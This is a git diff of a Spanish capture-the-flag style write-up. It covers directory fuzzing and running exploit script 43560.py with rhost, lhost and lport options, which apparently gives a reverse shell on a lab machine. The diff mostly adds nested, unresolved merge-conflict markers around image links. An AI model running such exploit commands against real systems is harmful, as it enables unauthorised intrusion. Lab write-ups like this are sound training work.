@@ -25,7 +25,11 @@ Y en el txt previamente enumerado podemos ver que han mitigado 2 vulnerabilidade
 
 Al hacerle fuzzing podemos ver que hay muchos más directorios que pueden ser interesantes, los cuáles vamos a enumerar para ver si tienen algún tipo de fichero importante.
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![](Pasted%20image%2020260424162705.png) 
+=======
+![](/Img/Pasted%20image%2020260424162705.png) 
+>>>>>>> origin/main
 =======
 ![](/Img/Pasted%20image%2020260424162705.png) 
 >>>>>>> origin/main
@@ -48,7 +52,11 @@ python3 43560.py --rhost 10.129.24.14 --lhost 10.10.14.180 --lport 4444 --userna
 ```
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![](Pasted%20image%2020260424183920.png)
+=======
+![](/img/Pasted%20image%2020260424183920.png)
+>>>>>>> origin/main
 =======
 ![](/img/Pasted%20image%2020260424183920.png)
 >>>>>>> origin/main
